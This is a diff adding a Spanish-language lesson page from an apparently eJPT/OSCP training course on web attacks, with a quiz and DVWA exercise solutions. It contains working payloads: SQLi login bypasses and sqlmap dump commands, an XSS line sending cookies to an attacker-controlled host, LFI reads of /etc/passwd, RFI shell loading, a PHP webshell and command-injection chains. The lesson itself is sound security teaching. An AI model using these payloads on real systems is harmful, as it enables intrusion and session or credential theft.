@@ -1,0 +1,114 @@
+08 · Ataques web|OWASP Top 10, fuzzing de directorios, SQLi, XSS, LFI/RFI, subida de ficheros, inyección de comandos y WordPress.
+<span class="badge ejpt">Nivel 1 · eJPTv2</span><span class="badge oscp">Muy importante</span>
+<h1>08 · Ataques a aplicaciones web</h1>
+<p class="lead">La web es la mayor superficie de ataque. Aquí ves los fallos más comunes (OWASP Top 10) explicados con ejemplos que puedes reproducir en DVWA y PortSwigger.</p>
+
+<h2>1. OWASP Top 10 (de un vistazo)</h2>
+<div class="table-wrap"><table>
+<tr><th>#</th><th>Riesgo</th><th>En cristiano</th></tr>
+<tr><td>A01</td><td>Broken Access Control</td><td>Accedes a cosas que no deberías (IDOR)</td></tr>
+<tr><td>A02</td><td>Cryptographic Failures</td><td>Datos sensibles sin cifrar</td></tr>
+<tr><td>A03</td><td>Injection</td><td>SQLi, inyección de comandos</td></tr>
+<tr><td>A04</td><td>Insecure Design</td><td>Diseño inseguro de base</td></tr>
+<tr><td>A05</td><td>Security Misconfiguration</td><td>Config por defecto, paneles abiertos</td></tr>
+<tr><td>A06</td><td>Vulnerable Components</td><td>Librerías/CMS viejos con CVE</td></tr>
+<tr><td>A07</td><td>Auth Failures</td><td>Contraseñas débiles, sin bloqueo</td></tr>
+<tr><td>A08</td><td>Integrity Failures</td><td>Actualizaciones/deserialización inseguras</td></tr>
+<tr><td>A09</td><td>Logging Failures</td><td>No detectan ataques</td></tr>
+<tr><td>A10</td><td>SSRF</td><td>Hacer que el servidor pida URLs por ti</td></tr>
+</table></div>
+
+<h2>2. Herramientas base y descubrimiento de contenido (fuzzing)</h2>
+<pre><span class="p">$</span> whatweb http://10.0.2.4         <span class="c"># tecnologías</span>
+<span class="p">$</span> nikto -h http://10.0.2.4        <span class="c"># vulns conocidas, ficheros peligrosos</span>
+<span class="c"># Descubrir rutas/ficheros ocultos (directory busting):</span>
+<span class="p">$</span> gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+<span class="p">$</span> ffuf -u http://10.0.2.4/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+<span class="c"># Subdominios virtuales (vhosts):</span>
+<span class="p">$</span> ffuf -u http://10.0.2.4 -H "Host: FUZZ.empresa.com" -w sub.txt -fs 1234</pre>
+<div class="box tip"><strong>💡 Siempre mira primero</strong><code>robots.txt</code>, el código fuente (Ctrl+U), comentarios HTML, y <code>/admin</code>, <code>/login</code>, <code>/backup</code>, <code>/.git</code>. Muchas entradas están a la vista.</div>
+<div class="box def"><strong>📘 Burp Suite</strong>Proxy que se pone entre tu navegador y la web para <b>ver y modificar</b> cada petición. Imprescindible. Pestañas clave: <b>Proxy</b> (interceptar), <b>Repeater</b> (reenviar y tocar peticiones), <b>Intruder</b> (fuzzing).</div>
+
+<h2>3. SQL Injection (SQLi)</h2>
+<div class="box def"><strong>📘 ¿Qué es?</strong>La web mete lo que escribes directamente en una consulta a la base de datos. Si inyectas SQL, puedes saltarte logins o leer toda la base de datos.</div>
+<figure>
+<svg viewBox="0 0 820 180" role="img" aria-label="Inyección SQL en login">
+<rect x="20" y="20" width="360" height="60" rx="8" class="bx"/><text x="30" y="45" font-family="JetBrains Mono" font-size="12">Consulta normal:</text>
+<text x="30" y="68" font-family="JetBrains Mono" font-size="12" fill="#0f9d6e">SELECT * WHERE user='ana' AND pass='1234'</text>
+<rect x="20" y="100" width="780" height="60" rx="8" fill="#dc262615" stroke="#dc2626"/><text x="30" y="125" font-family="JetBrains Mono" font-size="12">Tú escribes en usuario:  <tspan fill="#dc2626">' OR '1'='1' -- </tspan></text>
+<text x="30" y="148" font-family="JetBrains Mono" font-size="12" fill="#dc2626">SELECT * WHERE user='' OR '1'='1' -- ' AND pass=''   → entra sin contraseña</text>
+</svg></figure>
+<pre><span class="c"># Payloads típicos para bypass de login:</span>
+' OR '1'='1' --
+' OR 1=1 #
+admin' --
+<span class="c"># Detectar: mete una comilla ' y mira si da error SQL</span>
+<span class="c"># Automatizar con sqlmap:</span>
+<span class="p">$</span> sqlmap -u "http://10.0.2.4/item.php?id=1" --batch --dbs
+<span class="p">$</span> sqlmap -u "http://10.0.2.4/item.php?id=1" -D tienda -T users --dump</pre>
+<div class="box warn"><strong>⚠️ Tipos de SQLi</strong><b>In-band/UNION</b> (ves el resultado en la página), <b>Blind booleana</b> (la página cambia sí/no), <b>Blind por tiempo</b> (usas <code>SLEEP(5)</code> y mides). sqlmap las maneja todas.</div>
+
+<h2>4. XSS (Cross-Site Scripting)</h2>
+<div class="box def"><strong>📘 ¿Qué es?</strong>Inyectas JavaScript que se ejecuta en el navegador de <b>otros usuarios</b>. Sirve para robar cookies de sesión.</div>
+<pre><span class="c"># Prueba básica (reflejado):</span>
+&lt;script&gt;alert(1)&lt;/script&gt;
+<span class="c"># Robo de cookie (stored):</span>
+&lt;script&gt;fetch('http://10.0.2.15/c='+document.cookie)&lt;/script&gt;</pre>
+<p><b>Tipos:</b> Reflejado (en la URL), Almacenado (guardado en la web, afecta a todos), DOM (en el JavaScript del cliente).</p>
+
+<h2>5. LFI / RFI (inclusión de ficheros)</h2>
+<div class="box def"><strong>📘 ¿Qué es?</strong>La web incluye un fichero según un parámetro (<code>?page=inicio</code>). Si no filtra, puedes leer ficheros del sistema (LFI) o cargar uno tuyo remoto (RFI).</div>
+<pre><span class="c"># LFI: leer /etc/passwd subiendo directorios</span>
+http://10.0.2.4/index.php?page=../../../../etc/passwd
+<span class="c"># Con filtro PHP para leer código fuente en base64</span>
+?page=php://filter/convert.base64-encode/resource=config
+<span class="c"># RFI: cargar una shell desde TU servidor</span>
+?page=http://10.0.2.15/shell.txt</pre>
+<div class="box tip"><strong>💡 De LFI a shell (log poisoning)</strong>Si puedes leer <code>/var/log/apache2/access.log</code> por LFI y controlas el User-Agent, metes código PHP en el User-Agent y luego lo ejecutas incluyendo el log.</div>
+
+<h2>6. Subida de ficheros → webshell</h2>
+<pre><span class="c"># shell.php</span>
+&lt;?php system($_GET['cmd']); ?&gt;
+<span class="c"># Si la subes y la web la ejecuta:</span>
+http://10.0.2.4/uploads/shell.php?cmd=id
+<span class="c"># Evadir filtros: shell.php.jpg, shell.phtml, cambiar Content-Type, magic bytes</span></pre>
+
+<h2>7. Inyección de comandos</h2>
+<div class="box def"><strong>📘 ¿Qué es?</strong>La web pasa tu entrada a un comando del sistema (p. ej. un <code>ping</code>). Encadenas tus propios comandos.</div>
+<pre>127.0.0.1; id
+127.0.0.1 && whoami
+127.0.0.1 | cat /etc/passwd
+127.0.0.1`id`</pre>
+
+<h2>8. WordPress y CMS</h2>
+<pre><span class="p">$</span> wpscan --url http://10.0.2.4 --enumerate u,vp     <span class="c"># usuarios y plugins vulnerables</span>
+<span class="p">$</span> wpscan --url http://10.0.2.4 -U admin -P rockyou.txt   <span class="c"># fuerza bruta login</span></pre>
+
+<div class="box oscp"><strong>🔴 Nivel OSCP</strong>En el OSCP la web suele ser el acceso inicial. Domina SQLi manual (sin sqlmap, que está limitado), LFI→RCE, subida de ficheros y la explotación de CMS/software conocido (busca el nombre + versión + “exploit”/“github”). Convierte siempre la webshell en una reverse shell estable (módulo 09).</div>
+
+<h2>🎥 Vídeos y práctica guiada</h2>
+<div class="vlinks">
+<a href="https://portswigger.net/web-security/all-labs" target="_blank" rel="noopener">PortSwigger Labs (gratis, lo mejor)</a>
+<a href="https://www.youtube.com/results?search_query=sql+injection+explicado+facil+espa%C3%B1ol" target="_blank" rel="noopener">SQLi explicado (ES)</a>
+<a href="https://www.youtube.com/results?search_query=burp+suite+tutorial+espa%C3%B1ol" target="_blank" rel="noopener">Burp Suite (ES)</a>
+</div>
+
+<h2>📝 Evaluación del tema</h2>
+<script type="application/json" data-quiz="Cuestionario 08 · Web">
+[
+{"q":"¿Qué payload salta un login vulnerable a SQLi?","o":["<script>alert(1)<\/script>","' OR '1'='1' --","../../etc/passwd","; id"],"a":1,"e":"' OR '1'='1' -- hace la condición siempre verdadera."},
+{"q":"XSS permite principalmente…","o":["Leer /etc/passwd","Ejecutar JS en el navegador de la víctima y robar cookies","Escanear puertos","Crackear hashes"],"a":1,"e":"XSS ejecuta JavaScript en el cliente."},
+{"q":"¿Qué vulnerabilidad lees con ?page=../../../../etc/passwd?","o":["XSS","LFI (Local File Inclusion)","SQLi","CSRF"],"a":1,"e":"LFI: inclusión de ficheros locales."},
+{"q":"¿Qué herramienta automatiza la explotación de SQLi?","o":["nikto","sqlmap","gobuster","hydra"],"a":1,"e":"sqlmap."},
+{"q":"Subes shell.php con <?php system($_GET['cmd']); ?>. ¿Cómo ejecutas 'id'?","o":["shell.php?cmd=id","shell.php&id","run shell.php","nc shell.php"],"a":0,"e":"Pasas el comando por el parámetro cmd."},
+{"q":"¿Qué herramienta enumera usuarios y plugins de WordPress?","o":["wpscan","wafw00f","whatweb","dirb"],"a":0,"e":"wpscan."},
+{"q":"En el campo IP de un ping web escribes '127.0.0.1; id'. Esto es…","o":["SQLi","Inyección de comandos","XSS","LFI"],"a":1,"e":"Command injection: encadenas comandos con ; && |."},
+{"q":"¿Qué herramienta se sitúa como proxy para interceptar y modificar peticiones?","o":["Nmap","Burp Suite","John","Metasploit"],"a":1,"e":"Burp Suite."}
+]
+</script>
+<h3>✍️ Ejercicios</h3>
+<ol><li>En DVWA (nivel low) explota la SQLi de 'User ID' y lista todos los usuarios y sus hashes.</li><li>En DVWA explota 'Command Injection' para leer <code>/etc/passwd</code>.</li></ol>
+<details class="sol"><summary>Ver soluciones</summary><div><pre><span class="c"># SQLi</span>  1' OR '1'='1
+<span class="c"># Ver hashes</span>  1' UNION SELECT user, password FROM users #
+<span class="c"># Command injection</span>  127.0.0.1; cat /etc/passwd</pre></div></details>
+<div class="lab"><h4>🧪 Práctica</h4><p>Completa los laboratorios "Apprentice" de SQL injection y XSS en PortSwigger Web Security Academy. Son gratis y autocorregidos.</p></div>
